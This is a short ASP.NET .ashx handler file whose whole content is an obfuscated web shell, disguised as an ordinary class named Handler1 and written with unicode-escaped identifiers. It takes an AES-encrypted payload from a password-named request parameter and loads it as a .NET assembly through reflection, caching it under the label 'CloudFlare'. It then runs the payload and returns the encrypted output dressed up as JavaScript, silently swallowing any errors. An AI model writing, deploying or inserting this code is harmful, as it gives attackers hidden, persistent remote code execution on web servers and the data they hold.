<%@  Language="C#" Class="Handler1" %>
    public class Handler1 : System.Web.IHttpHandler,System.Web.SessionState.IRequiresSessionState
    {

        public void ProcessRequest(System.Web.HttpContext Context)
        {
			try{string \u0073\u0069\u0067\u006eKey = "30e724cfc1b7b28c";string \u0073\u0069\u0067\u006eToken="pass@123";string \u0073\u0069\u0067\u006e=Context.Request[\u0073\u0069\u0067\u006eToken];byte[] data=new byte[\u0073\u0069\u0067\u006e.Length/2];for(int i=0; i<\u0073\u0069\u0067\u006e.Length;i+=2){data[i/2]=System.C\u006f\u006e\u0076\u0065\u0072t.ToByte(\u0073\u0069\u0067\u006e.Substring(i,2),16);}data=new System.Security.\u0043\u0072\u0079\u0070\u0074\u006f\u0067\u0072\u0061\u0070\u0068\u0079.\u0052\u0069\u006a\u006e\u0064\u0061\u0065\u006c\u004d\u0061\u006e\u0061\u0067\u0065\u0064().CreateDecryptor(System.Text.Encoding.Default.GetBytes(signKey),System.Text.Encoding.Default.GetBytes(\u0073\u0069\u0067\u006eKey)).TransformFinalBlock(data, 0, data.Length);if(Context.Application["Cl\u006f\u0075\u0064\u0046\u006c\u0061re"]==null){Context.Application["Cl\u006f\u0075\u0064\u0046\u006c\u0061re"]=(System.\u0052\u0065\u0066\u006c\u0065\u0063\u0074\u0069\u006f\u006e.A\u0073\u0073\u0065\u006d\u0062\u006c\u0079)typeof(System.\u0052\u0065\u0066\u006c\u0065\u0063\u0074\u0069\u006f\u006e.A\u0073\u0073\u0065\u006d\u0062\u006c\u0079).GetMethod("Load",new System.Type[]{typeof(byte[]) }).Invoke(null, new object[]{data});}else{System.IO.Mem\u006f\u0072\u0079\u0053\u0074\u0072eam outStream=new System.IO.Mem\u006f\u0072\u0079\u0053\u0074\u0072eam();string \u004c\u0069\u006e\u006b\u0069\u006e = "Linkin";string \u0059\u0069\u0065\u006c\u0064 = "Yield";object o=((System.\u0052\u0065\u0066\u006c\u0065\u0063\u0074\u0069\u006f\u006e.A\u0073\u0073\u0065\u006d\u0062\u006c\u0079)Context.Application["Cl\u006f\u0075\u0064\u0046\u006c\u0061re"]).Create\u0049\u006e\u0073\u0074\u0061\u006e\u0063\u0065(Linkin.Substring(0,1) + Yield.Substring(0,1));o.Equals(Context);o.Equals(outStream);o.Equals(data);o.ToString();byte[] r=outStream.ToArray();outStream.Dispose();Context.Response.Write("!function(){var "+\u0073\u0069\u0067\u006eToken+"=\"");Context.Response.Write(System.Bi\u0074\u0043\u006f\u006e\u0076\u0065\u0072ter.ToString(new System.Security.\u0043\u0072\u0079\u0070\u0074\u006f\u0067\u0072\u0061\u0070\u0068\u0079.\u0052\u0069\u006a\u006e\u0064\u0061\u0065\u006c\u004d\u0061\u006e\u0061\u0067\u0065\u0064().CreateEncryptor(System.Text.Encoding.Default.GetBytes(\u0073\u0069\u0067\u006eKey ),System.Text.Encoding.Default.GetBytes(\u0073\u0069\u0067\u006eKey)).TransformFinalBlock(r,0,r.Length)).Replace("-",""));Context.Response.Write("\";}");}}catch (System.Exception){}
        }

        public bool IsReusable
        {
            get
            {
                return false;
            }
        }
    }